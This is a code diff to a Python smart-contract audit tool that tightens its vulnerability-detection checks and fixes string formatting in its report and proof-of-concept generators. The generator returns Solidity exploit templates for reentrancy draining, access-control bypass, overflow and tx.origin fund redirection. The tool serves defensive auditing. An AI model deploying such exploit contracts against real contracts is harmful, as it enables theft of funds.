@@ -193,7 +193,7 @@ async def fetch_contract_source(address: str, chain: str) -> Optional[str]:
 
 VULNERABILITY_PATTERNS = [
     {"id": "REENTRANCY", "name": "Reentrancy Vulnerability", "severity": "CRITICAL", "cvss": 9.1,
-     "check": lambda c: (".call(" in c or ".send(" in c) and ("value" in c or ".send(" in c) and "ReentrancyGuard" not in c and "checks-effects" not in c.lower() and "nonReentrant" not in c,
+     "check": lambda c: (".call(" in c or ".call{" in c or ".send(" in c) and ("value" in c or ".send(" in c) and "ReentrancyGuard" not in c and "checks-effects" not in c.lower() and "nonReentrant" not in c,
      "desc": "External call without reentrancy guard", "fix": "Use ReentrancyGuard modifier or checks-effects-interactions pattern"},
     {"id": "ACCESS_CONTROL", "name": "Missing Access Control", "severity": "CRITICAL", "cvss": 9.0,
      "check": lambda c: ("withdraw" in c or "transfer" in c or "mint" in c or "burn" in c) and "only" not in c.lower() and "require(msg.sender" not in c and "modifier" not in c.lower(),
@@ -204,7 +204,7 @@ VULNERABILITY_PATTERNS = [
     {"id": "TX_ORIGIN", "name": "tx.origin Vulnerability", "severity": "MEDIUM", "cvss": 5.3,
      "check": lambda c: "tx.origin" in c, "desc": "Using tx.origin for authorization", "fix": "Use msg.sender instead of tx.origin"},
     {"id": "UNCHECKED_CALL", "name": "Unchecked External Call", "severity": "HIGH", "cvss": 7.5,
-     "check": lambda c: ".call(" in c and "require(" not in c and "if not" not in c.lower() and "if(" not in c and "return" not in c.lower().split("#")[0].split("//")[0],
+     "check": lambda c: (".call(" in c or ".call{" in c) and "require(" not in c and "if not" not in c.lower() and "if(" not in c and "return" not in c.lower().split("#")[0].split("//")[0],
      "desc": "External call return value not checked", "fix": "Check return value or use SafeERC20"},
     {"id": "TIMESTAMP_DEP", "name": "Timestamp Dependence", "severity": "MEDIUM", "cvss": 4.8,
      "check": lambda c: ("now" in c or "block.timestamp" in c) and ("lottery" in c or "draw" in c or "random" in c or "winner" in c),
@@ -561,7 +561,7 @@ async def get_report(task_id: str):
 
 
 def generate_markdown_report(result: dict) -> str:
-    lines = [f"# Solidify Security Audit Report\n",
+    lines = ["# Solidify Security Audit Report\n",
              f"## Summary\n- **Security Score**: {result.get('score', 'N/A')}/10\n- **Vulnerabilities Found**: {len(result.get('vulnerabilities', []))}\n",
              f"{result.get('summary', '')}\n---\n"]
     for v in result.get("vulnerabilities", []):
@@ -576,42 +576,42 @@ def generate_markdown_report(result: dict) -> str:
 def generate_poc_exploit(vuln: dict, target: str) -> str:
     t = vuln.get("type", "").lower()
     if "reentrancy" in t:
-        return f"""// SPDX-License-Identifier: MIT
+        return """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-contract ReentrancyAttacker {{
+contract ReentrancyAttacker {
     address public victim;
-    constructor(address _victim) {{ victim = _victim; }}
-    function attack() external payable {{
-        (bool ok,) = victim.call{{value: msg.value}}("withdraw");
+    constructor(address _victim) { victim = _victim; }
+    function attack() external payable {
+        (bool ok,) = victim.call{value: msg.value}("withdraw");
         require(ok, "call failed");
-    }}
-    receive() external payable {{
-        if (victim.balance >= 1 ether) {{
-            (bool ok,) = victim.call{{value: 0}}("withdraw");
-        }}
-    }}
-}}"""
+    }
+    receive() external payable {
+        if (victim.balance >= 1 ether) {
+            (bool ok,) = victim.call{value: 0}("withdraw");
+        }
+    }
+}"""
     if "access control" in t:
-        return f"""// SPDX-License-Identifier: MIT
+        return """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-contract AccessControlBypass {{
-    function exploit(address target) external {{
+contract AccessControlBypass {
+    function exploit(address target) external {
         (bool ok,) = target.call(abi.encodeWithSignature("withdraw()"));
         require(ok, "Access bypassed if no revert");
-    }}
-}}"""
+    }
+}"""
     if "overflow" in t:
         return "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract OverflowExploit {\n    function exploit() external pure returns (uint256) {\n        unchecked { return type(uint256).max + 1; }\n    }\n}"
     if "tx.origin" in t:
-        return f"""// SPDX-License-Identifier: MIT
+        return """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-contract TxOriginExploit {{
+contract TxOriginExploit {
     address public attacker;
-    constructor(address _attacker) {{ attacker = _attacker; }}
-    function exploit(address target) external {{
+    constructor(address _attacker) { attacker = _attacker; }
+    function exploit(address target) external {
         (bool ok,) = target.call(abi.encodeWithSignature("withdrawTo(address)", attacker));
-    }}
-}}"""
+    }
+}"""
     return f"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract GenericExploit {{ string public vulnType = \"{vuln.get('type', 'Unknown')}\"; }}"
 
 
